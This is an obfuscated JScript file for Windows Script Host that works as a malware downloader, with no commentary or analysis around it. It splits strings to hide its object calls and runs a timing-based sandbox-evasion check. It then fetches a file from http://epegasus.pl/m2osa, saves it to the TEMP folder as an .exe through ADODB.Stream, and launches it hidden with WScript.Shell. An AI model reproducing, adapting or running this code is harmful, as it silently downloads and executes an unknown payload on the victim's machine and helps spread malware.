var G0 = false;
var YI = "Create"+"Object";
var D = function N() {return WScript[YI]("WScript"+".Shell");}(), FP = 11;
var SG = "MSXML2"+".XMLHTTP";
var A0 = 2;
var K0 = A0 - 2;
function K(A){D["Run"](A, K0, K0);};
function VC(){return SG + "";};
function S(GZ, F){K0 = K0 * 1; return GZ - F;};
function QN(){return YI;};
/*@cc_on
  @if (@_win32 || @_win64)
    G0 = true;
  @end
@*/
if (G0)
{
var L = "";
function DJ(){return 22;};
var G = 0; var YE = 0;
function X()
{
var EU = new this["Date"]();
var HI = EU["getUTCMilliseconds"]();
WScript["Sleep"](DJ());
var EU = new this["Date"]();
var Y0 = EU["getUTCMilliseconds"]();
WScript["Sleep"](DJ());
var EU = new this["Date"]();
var O = EU["getUTCMilliseconds"]();
var G = "FJ";
G = S(Y0, HI);
var YE = "Y";
YE = S(O, Y0);
L = "open";
return S(G, YE);
}
var SM = false;
var KL = false;
for (var N0 = K0; N0 < DJ() * 1; N0++){if (X() != K0){
SM = true; 
YE = "31" + 11 * G + YE; 
KL = true; 
break;
}}
function AL() {return ((SM == true) && (SM == KL)) ? 1 : K0;};
if (SM && AL() && KL){
function XO() {return D["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "urKU5D6bAPQd.ex" + "e";};
 PT = VC();
 Y1 = WScript[YI](PT);
 var H = 1;
do { 
	for (;H;){
	try {
		if (H == 1)
		{
			Y1[L]("GET", "http://epegasus.pl/m2osa", false);
			Y1["send"]();
			NZ = "Sleep";
			H = 2;
		}
		WScript[NZ](DJ() + 120); 
		if (Y1["readystate"] < 2 * 2) continue;
		H = K0;
		function YX(MW) {var PO = (1, 2, 3, 4, 5, MW); return PO;};
		S0 = WScript[QN()]("ADODB.Stream");
		PT = S0;
		PT[L]();
		PT["type"] = YX(1);
		PT["write"](Y1["ResponseBody"]);
		S0["position"] = YX(K0);
		PT["Save" + "ToFile"](XO(), 2);
		S0["cl"+"ose"]();
		KV = XO();
		K(KV);
	} catch(Z){};};
}while (H);
}
}

